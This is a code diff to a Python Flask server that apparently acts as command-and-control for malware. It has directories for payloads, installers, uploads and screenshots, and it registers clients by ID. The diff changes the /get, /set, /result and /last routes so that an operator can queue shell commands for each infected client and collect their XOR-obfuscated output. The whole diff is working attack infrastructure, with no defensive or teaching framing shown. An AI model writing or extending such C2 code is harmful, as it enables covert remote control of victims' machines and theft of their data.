@@ -18,6 +18,8 @@ CODE_DIR = os.path.join(CURRENT_DIR, "payloads")
 INSTALLER_DIR = os.path.join(CURRENT_DIR, "installers")
 UPLOAD_DIR = os.path.join(CURRENT_DIR, "uploads")
 SCREENSHOTS_DIR = os.path.join(CURRENT_DIR, "screenshots")
+dynamic_cmd = {}
+dynamic_result = {}
 
 os.makedirs(CODE_DIR, exist_ok=True)
 os.makedirs(INSTALLER_DIR, exist_ok=True)
@@ -231,25 +233,29 @@ def update_client_info():
     print(f"[+] Client {cid} from {request.remote_addr}")
     return "OK"
 
-@app.route("/get")
-def get_command():
-    return current_cmd
+@app.route("/get/<id>")
+def get_command(id):
+    value = dynamic_cmd.get(id)
+    if value is None:
+       return ("echo error getting the command")
+    return value, 200
 
-@app.route("/set", methods=["POST"])
-def set_command():
-    global current_cmd
-    current_cmd = request.data.decode()
+
+
+@app.route("/set/<id>", methods=["POST"])
+def set_command(id):
+    dynamic_cmd[id] = request.data.decode()
     return "OK"
 
-@app.route("/result", methods=["POST"])
-def result():
-    global last_result
-    last_result = xor(request.data.decode())
+@app.route("/result/<id>", methods=["POST"])
+def result(id):
+    dynamic_result[id] = xor(request.data.decode())
     return "OK"
 
-@app.route("/last")
-def last():
-    return last_result or "[*] No result yet."
+@app.route("/last/<id>")
+def last(id):
+    last_result = dynamic_result.get(id)
+    return last_result or "[*] No result yet"
 
 @app.route("/upload_file", methods=["POST"])
 def upload_file():
